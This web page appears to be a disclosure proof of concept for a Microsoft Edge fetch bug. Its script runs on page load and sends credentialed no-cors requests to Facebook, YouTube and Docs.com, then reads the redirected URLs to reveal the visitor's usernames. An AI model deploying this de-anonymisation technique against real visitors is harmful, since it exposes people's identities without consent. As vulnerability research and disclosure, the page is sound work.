---
layout: default
title: Microsoft Edge Fetch Proof of Concept
---

# Microsoft Edge Fetch Proof of Concept

For the PoC to work, you must be browsing this with Microsoft Edge and be logged in one of the listed services.

<h3 id="Facebook">Facebook loading...</h3>
<h3 id="Youtube">Youtube loading...</h3>
<h3 id="Docs.com">Docs.com loading...</h3>
<h3 id="error"></h3>
If any of the above contains your username, an attacker could identify you by reading the username from the URL. All your public information on this page is also available to the attacker (for instance all your public Facebook details that can be found by browsing to the above URL).
<script>
function update(url, id)
{
    fetch(url, {
            mode: "no-cors",
            credentials: "include",
         }).then(function(response) {
                console.log(response);
                if (!response.url) {
                    document.getElementById("error").innerHTML = "Fetch does not leak URL (your browser is safe)";
                    document.getElementById(id).innerHTML = "";
                }
                else
                {
                    document.getElementById(id).innerHTML = id + ": " + response.url;
                }
            }).catch(function(error) {
                console.log("Failed with: ", error);
    });
}
window.onload = function() {
    update("https://facebook.com/me", "Facebook");
    update("https://youtube.com/profile", "Youtube");
    update("https://docs.com/me", "Docs.com");
}
</script>